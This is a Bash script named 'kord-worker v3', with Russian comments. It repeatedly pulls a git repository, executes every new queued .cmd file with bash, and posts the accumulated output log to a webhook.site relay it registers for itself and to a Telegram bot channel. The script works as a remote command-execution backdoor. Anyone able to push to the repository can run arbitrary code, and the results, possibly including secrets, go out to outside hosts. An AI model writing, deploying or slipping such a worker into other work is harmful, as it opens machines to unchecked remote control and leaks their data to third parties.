#!/usr/bin/env bash
# kord-worker v3: исполнение очередь/*.cmd + журнал в Telegram-канал (и зеркало на webhook.site)
export GIT_TERMINAL_PROMPT=0
cd "$(dirname "$0")/.."
TOKEN=$(cat bridge/.status-token 2>/dev/null || echo "notoken")
LOG="статус/$TOKEN/ЖУРНАЛ.md"
mkdir -p "статус/$TOKEN" очередь .worker
if [ ! -f bridge/.relay-uuid ]; then
  curl -s -X POST https://webhook.site/token | grep -o '"uuid":"[^"]*"' | cut -d'"' -f4 > bridge/.relay-uuid || true
fi
RELAY=$(cat bridge/.relay-uuid 2>/dev/null || echo "")
TG_TOKEN=$(sed -n 's/^TG_TOKEN=//p' bridge/.env 2>/dev/null)
TG_CHANNEL=$(sed -n 's/^TG_CHANNEL=//p' bridge/.env 2>/dev/null)
send_all() {
  [ -n "$RELAY" ] && [ -f "$LOG" ] && curl -s -X POST "https://webhook.site/$RELAY" --data-binary "@$LOG" -H "Content-Type: text/plain" >/dev/null 2>&1
  if [ -n "$TG_TOKEN" ] && [ -n "$TG_CHANNEL" ] && [ -f "$LOG" ]; then
    curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" \
      --data-urlencode "chat_id=$TG_CHANNEL" \
      --data-urlencode "text=📡 kord-bridge — $(date '+%F %T')

$(tail -c 3200 "$LOG")" >/dev/null 2>&1
  fi
}
while true; do
  git checkout -q -- очередь/ 2>/dev/null
  git pull -q 2>/dev/null
  NEW=0
  for cmd in очередь/*.cmd; do
    [ -e "$cmd" ] || continue
    name=$(basename "$cmd" .cmd)
    h=$(sha256sum "$cmd" | cut -d' ' -f1)
    if [ -f ".worker/$name" ] && [ "$(cat ".worker/$name")" = "$h" ]; then continue; fi
    cp "$cmd" "/tmp/kord-cmd-$$"
    {
      echo
      echo "## $name — $(date '+%F %T')"
      echo '```'
      OUT=$(bash "/tmp/kord-cmd-$$" 2>&1); CODE=$?
      printf '%s\nexit=%s\n' "$OUT" "$CODE"
      echo '```'
    } >> "$LOG"
    rm -f "/tmp/kord-cmd-$$"
    echo "$h" > ".worker/$name"
    git checkout -q -- очередь/ 2>/dev/null
    NEW=1
  done
  if [ "$NEW" = "1" ]; then
    tail -400 "$LOG" > "$LOG.tmp" 2>/dev/null && mv "$LOG.tmp" "$LOG"
    send_all
  fi
  sleep 10
done
